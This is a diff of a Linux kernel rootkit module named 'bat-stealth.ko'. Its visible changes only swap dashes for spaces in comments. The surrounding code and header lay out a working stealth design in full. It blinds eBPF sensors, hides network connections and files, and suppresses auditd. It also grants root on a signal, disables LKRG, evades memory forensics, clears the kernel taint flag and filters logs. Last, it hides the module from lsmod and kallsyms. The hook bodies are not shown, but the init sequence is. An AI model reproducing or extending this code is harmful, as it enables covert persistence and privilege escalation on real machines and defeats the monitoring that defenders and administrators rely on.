@@ -1,25 +1,25 @@
-/* bat-stealth.ko — Kernel-level stealth layer for Bat v9.
+/* bat-stealth.ko   Kernel-level stealth layer for Bat v9.
  *
  * S1 modules: ftrace_helper, pid_manager, sysfs_iface, bpf_hook, hiding_tcp
  * S2 modules: audit, hiding_fs, become_root, lkrg_bypass, selfdefense,
  *             reset_tainted, clear_taint_dmesg, sysrq_hook, taskstats_hook,
  *             hide_module
  *
- * Init order (CRITICAL — do not reorder):
- *   1. pid_manager       — arrays ready before any hook fires
- *   2. sysfs_iface       — /sys/kernel/bat_stealth/ created (bat-agent writes here)
- *   3. bpf_hook          — eBPF sensors blinded (P-01..P-26)
- *   4. hiding_tcp        — connections hidden from ss/netstat
- *   5. audit             — auditd events suppressed
- *   6. hiding_fs         — filesystem entries hidden
- *   7. become_root       — signal 59 triggers uid=0 + PID-enum blocking
- *   8. lkrg_bypass       — LKRG enforcement disabled
- *   9. selfdefense       — memory forensics evasion (LiME, kallsyms, kprobe)
- *  10. reset_tainted     — /proc/sys/kernel/tainted → 0
- *  11. clear_taint_dmesg — dmesg/log lines filtered
- *  12. sysrq_hook        — SysRq task dump hidden
- *  13. taskstats_hook    — NETLINK taskstats filtered (graceful no-op if unavailable)
- *  14. hide_module       — LAST: removes bat-stealth from lsmod/sysfs/kallsyms
+ * Init order (CRITICAL   do not reorder):
+ *   1. pid_manager         arrays ready before any hook fires
+ *   2. sysfs_iface         /sys/kernel/bat_stealth/ created (bat-agent writes here)
+ *   3. bpf_hook            eBPF sensors blinded (P-01..P-26)
+ *   4. hiding_tcp          connections hidden from ss/netstat
+ *   5. audit               auditd events suppressed
+ *   6. hiding_fs           filesystem entries hidden
+ *   7. become_root         signal 59 triggers uid=0 + PID-enum blocking
+ *   8. lkrg_bypass         LKRG enforcement disabled
+ *   9. selfdefense         memory forensics evasion (LiME, kallsyms, kprobe)
+ *  10. reset_tainted       /proc/sys/kernel/tainted → 0
+ *  11. clear_taint_dmesg   dmesg/log lines filtered
+ *  12. sysrq_hook          SysRq task dump hidden
+ *  13. taskstats_hook      NETLINK taskstats filtered (graceful no-op if unavailable)
+ *  14. hide_module         LAST: removes bat-stealth from lsmod/sysfs/kallsyms
  *
  * Unload (K-99):
  *   Phase 1: echo "1" > /sys/kernel/bat_stealth/unload
@@ -67,7 +67,7 @@ static int __init bat_stealth_init(void)
         goto err_pid;
     }
 
-    /* 3. bpf_hook — non-fatal, partial install acceptable */
+    /* 3. bpf_hook   non-fatal, partial install acceptable */
     ret = bpf_hook_init();
     if (ret != 0) {
         pr_warn("bat-stealth: bpf_hook_init partial: %d (continuing)\n", ret);
@@ -85,7 +85,7 @@ static int __init bat_stealth_init(void)
     ret = audit_init();
     if (ret) {
         pr_warn("bat-stealth: audit_init failed: %d (continuing)\n", ret);
-        /* Non-fatal — auditd may not be running */
+        /* Non-fatal   auditd may not be running */
     }
 
     /* 6. hiding_fs */
@@ -100,7 +100,7 @@ static int __init bat_stealth_init(void)
         pr_warn("bat-stealth: become_root_init failed: %d (continuing)\n", ret);
     }
 
-    /* 8. lkrg_bypass — always returns 0 (graceful no-op without LKRG) */
+    /* 8. lkrg_bypass   always returns 0 (graceful no-op without LKRG) */
     lkrg_bypass_init();
 
     /* 9. selfdefense */
@@ -127,10 +127,10 @@ static int __init bat_stealth_init(void)
         pr_warn("bat-stealth: sysrq_hook_init failed: %d (continuing)\n", ret);
     }
 
-    /* 13. taskstats_hook — always returns 0 (graceful no-op) */
+    /* 13. taskstats_hook   always returns 0 (graceful no-op) */
     taskstats_hook_init();
 
-    /* 14. hide_module — MUST be last */
+    /* 14. hide_module   MUST be last */
     module_hide_current();
 
     return 0;
@@ -147,7 +147,7 @@ err_pid:
 
 static void __exit bat_stealth_exit(void)
 {
-    /* Reverse order — hide_module was already undone by module_unhide() in Phase 1 */
+    /* Reverse order   hide_module was already undone by module_unhide() in Phase 1 */
     taskstats_hook_exit();
     sysrq_hook_exit();
     clear_taint_dmesg_exit();
